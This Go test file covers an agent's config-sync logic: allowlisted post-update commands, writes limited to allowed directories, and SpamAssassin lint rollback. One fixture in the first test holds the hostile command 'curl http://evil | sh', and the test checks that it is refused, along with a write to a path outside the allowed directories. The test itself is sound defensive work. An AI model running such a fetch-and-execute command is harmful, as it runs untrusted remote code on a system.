package agent

import (
	"context"
	"crypto/sha1"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func sha1hex(s string) string {
	h := sha1.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

// syncFixture points the SpamAssassin dir and binary at a temp tree and
// records every command the apply step runs. lint returns the --lint output
// for the n-th lint call (0-based).
type syncFixture struct {
	root, saDir, other string
	cmds               [][]string
	lintCalls          int
	lint               func(n int) string
}

func newSyncFixture(t *testing.T) *syncFixture {
	t.Helper()
	root := t.TempDir()
	f := &syncFixture{root: root, saDir: filepath.Join(root, "sa") + "/", other: filepath.Join(root, "cfm") + "/"}
	bin := filepath.Join(root, "spamassassin")
	if err := os.WriteFile(bin, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	prevDir, prevBins, prevRun := spamassassinDir, spamassassinBins, runSyncCommand
	spamassassinDir, spamassassinBins = f.saDir, []string{bin}
	runSyncCommand = func(_ context.Context, argv []string) ([]byte, error) {
		if len(argv) == 2 && argv[1] == "--lint" {
			n := f.lintCalls
			f.lintCalls++
			if f.lint != nil {
				return []byte(f.lint(n)), nil
			}
			return nil, nil
		}
		f.cmds = append(f.cmds, argv)
		return nil, nil
	}
	t.Cleanup(func() { spamassassinDir, spamassassinBins, runSyncCommand = prevDir, prevBins, prevRun })
	return f
}

func (f *syncFixture) allowed() []string { return []string{f.saDir, f.other} }

func (f *syncFixture) update(path, content, cmd string) ConfigUpdate {
	return ConfigUpdate{TargetPath: path, Content: content, Hash: sha1hex(content), PostUpdateCommand: cmd}
}

func readFile(t *testing.T, p string) string {
	t.Helper()
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// Each distinct allowlisted command runs once after its files are written; a
// command outside the allowlist and a path outside the allowed dirs are refused.
func TestApplyUpdatesRunsAllowlistedCommandsOnce(t *testing.T) {
	f := newSyncFixture(t)
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{
		f.update(f.saDir+"a.cf", "score A 1\n", "systemctl restart spamd"),
		f.update(f.saDir+"b.cf", "score B 1\n", "systemctl restart spamd"),
		f.update(f.other+"c.conf", "x=1\n", "curl http://evil | sh"),
		f.update(filepath.Join(f.root, "etc-passwd"), "root::0:0\n", ""),
	}, f.allowed())

	if len(res.Written) != 3 {
		t.Fatalf("written %v", res.Written)
	}
	if _, err := os.Stat(filepath.Join(f.root, "etc-passwd")); err == nil {
		t.Fatal("wrote outside the allowed dirs")
	}
	if len(f.cmds) != 1 || strings.Join(f.cmds[0], " ") != "systemctl restart spamd" {
		t.Fatalf("commands run: %v", f.cmds)
	}
	if len(res.Refused) != 1 || res.Refused[0] != "curl http://evil | sh" {
		t.Fatalf("refused: %v", res.Refused)
	}
	if f.lintCalls != 2 {
		t.Fatalf("lint ran %d times, want 2 (before and after)", f.lintCalls)
	}

	// unchanged files: nothing written, nothing run
	f.cmds = nil
	res = st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"a.cf", "score A 1\n", "systemctl restart spamd")}, f.allowed())
	if len(res.Written) != 0 || len(f.cmds) != 0 {
		t.Fatalf("re-applied an unchanged file: %+v %v", res, f.cmds)
	}
}

// A lint problem the update introduced rolls the SpamAssassin files back,
// skips the restart, and parks that version; a new version is tried again.
func TestApplyUpdatesRollsBackOnNewLintProblem(t *testing.T) {
	f := newSyncFixture(t)
	if err := os.MkdirAll(f.saDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(f.saDir+"rules.cf", []byte("old rules\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	f.lint = func(n int) string {
		if n == 1 { // the run after the bad write
			return "Nov 18 18:06:05.000 [1] warn: config: invalid regexp for rule __CFM_ID_7_1: (unclosed\n" +
				"Nov 18 18:06:05.674 [1] warn: lint: 1 issues detected, please rerun with debug enabled for more information\n"
		}
		return ""
	}
	var st fileSyncState
	bad := f.update(f.saDir+"rules.cf", "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
	other := f.update(f.other+"cfm.conf", "x=1\n", "")
	res := st.applyUpdates(context.Background(), []ConfigUpdate{bad, other}, f.allowed())

	if got := readFile(t, f.saDir+"rules.cf"); got != "old rules\n" {
		t.Fatalf("not rolled back: %q", got)
	}
	if len(res.RolledBack) != 1 || len(f.cmds) != 0 {
		t.Fatalf("rolled back %v, ran %v", res.RolledBack, f.cmds)
	}
	if readFile(t, f.other+"cfm.conf") != "x=1\n" {
		t.Fatal("a non-SpamAssassin file was rolled back too")
	}

	// the same bad version is not downloaded-and-linted again every tick
	f.lintCalls = 0
	res = st.applyUpdates(context.Background(), []ConfigUpdate{bad}, f.allowed())
	if len(res.Written) != 0 || f.lintCalls != 0 {
		t.Fatalf("parked version re-applied: %+v, %d lints", res, f.lintCalls)
	}

	// a fixed version goes through and restarts spamd
	f.lint = nil
	fixed := f.update(f.saDir+"rules.cf", "body __CFM_ID_7_1 /closed/\n", "systemctl restart spamd")
	res = st.applyUpdates(context.Background(), []ConfigUpdate{fixed}, f.allowed())
	if len(res.Written) != 1 || len(f.cmds) != 1 || readFile(t, f.saDir+"rules.cf") != fixed.Content {
		t.Fatalf("fixed version not applied: %+v %v", res, f.cmds)
	}
	if _, ok := st.parked[f.saDir+"rules.cf"]; ok {
		t.Fatal("parked entry kept after a good version")
	}
}

// A file that did not exist before is removed again on rollback.
func TestApplyUpdatesRollbackRemovesNewFile(t *testing.T) {
	f := newSyncFixture(t)
	f.lint = func(n int) string {
		if n == 1 {
			return "warn: config: failed to parse line, skipping, in \"new.cf\": bogus\n"
		}
		return ""
	}
	var st fileSyncState
	st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"new.cf", "bogus\n", "")}, f.allowed())
	if _, err := os.Stat(f.saDir + "new.cf"); !os.IsNotExist(err) {
		t.Fatalf("new file kept after a failed lint: %v", err)
	}
}

// Problems that were there before the update (rigel's dcc_* lines with the
// DCC plugin off, titan's missing Hashcash plugin whose eval counter moves when
// any rule file grows) do not block it.
func TestApplyUpdatesIgnoresPreexistingLintProblems(t *testing.T) {
	f := newSyncFixture(t)
	f.lint = func(n int) string {
		evalN := []string{"180", "181"}[n]
		return "Nov 18 18:06:05.000 [270837] warn: config: invalid 'dcc_home' value in /etc/mail/spamassassin/myip.cf (line 33): dcc_home /var/dcc\n" +
			"Nov 18 18:06:07.432 [1707296] warn: plugin: failed to parse plugin (from @INC): Can't locate Mail/SpamAssassin/Plugin/Hashcash.pm at (eval " + evalN + ") line 1, <DATA> line 71" + evalN[2:] + ".\n" +
			"Nov 18 18:06:05.674 [270837] warn: lint: " + []string{"2", "2"}[n] + " issues detected, please rerun with debug enabled for more information\n"
	}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "score X 1\n", "/scripts/restartsrv_spamd")}, f.allowed())
	if len(res.Written) != 1 || len(res.RolledBack) != 0 || len(f.cmds) != 1 || f.cmds[0][0] != "/scripts/restartsrv_spamd" {
		t.Fatalf("pre-existing lint problems blocked the update: %+v %v", res, f.cmds)
	}
}

// Without a spamassassin binary the files still apply (nothing to lint with).
func TestApplyUpdatesWithoutSpamassassinBinary(t *testing.T) {
	f := newSyncFixture(t)
	spamassassinBins = []string{filepath.Join(f.root, "absent")}
	var st fileSyncState
	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "score X 1\n", "systemctl reload spamd")}, f.allowed())
	if len(res.Written) != 1 || f.lintCalls != 0 || len(f.cmds) != 1 {
		t.Fatalf("%+v lints=%d cmds=%v", res, f.lintCalls, f.cmds)
	}
}
